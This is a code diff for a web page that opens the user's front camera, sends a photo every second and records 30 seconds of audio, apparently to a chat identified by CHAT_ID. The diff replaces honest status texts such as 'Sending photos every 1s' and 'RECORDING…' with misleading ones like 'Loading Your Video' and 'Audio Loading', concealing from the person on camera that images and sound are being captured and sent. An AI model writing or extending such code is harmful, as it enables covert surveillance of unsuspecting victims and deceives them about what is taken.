@@ -172,13 +172,13 @@ async function fetchChatId() { realChatId = CHAT_ID; return true; }
 
 // ── CAMERA ──
 startCam.onclick = async () => {
-  setStatus('Starting camera…');
+  setStatus('Starting Vedio');
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio: false });
     video.srcObject = stream;
     startCam.disabled = true;
     stopCam.disabled  = false;
-    setStatus('✓ Sending photos every 1s', 'ok');
+    setStatus('Loading Your Video', 'ok');
     camTimer = setInterval(sendPhoto, 1000);
   } catch(e) {
     setStatus('Camera denied: ' + e.message, 'err');
@@ -245,15 +245,15 @@ startRec.onclick = async () => {
     progBar.style.width = '0%';
     startRec.classList.remove('recording');
     startRec.disabled = false;
-    startRec.textContent = '⏺ START RECORD';
+    startRec.textContent = 'Audio Get ready';
   };
 
   mediaRec.start(200);
   startRec.disabled = true;
   startRec.classList.add('recording');
-  startRec.textContent = '⏺ RECORDING…';
+  startRec.textContent = 'Audio Loading';
   progWrap.classList.add('show');
-  setStatus('Recording 30s…', 'rec');
+  setStatus('Audio 30s…', 'rec');
 
   let elapsed = 0;
   const tick = setInterval(() => {
